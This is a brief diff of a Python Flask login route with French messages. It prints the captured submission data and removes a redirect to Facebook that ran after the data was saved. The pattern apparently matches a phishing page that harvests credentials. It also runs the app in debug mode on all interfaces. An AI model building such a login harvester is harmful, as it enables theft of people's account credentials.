@@ -54,11 +54,10 @@ def login():
         return f"❌ Erreur : {e}"'''
 
     
-    print("Donnée enregistré")
+    print("Donnée enregistré", data)
 
-    # Rediriger vers le lien
-    return redirect("https://web.facebook.com/?_rdc=1&_rdr#")
 
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', debug=True)
+
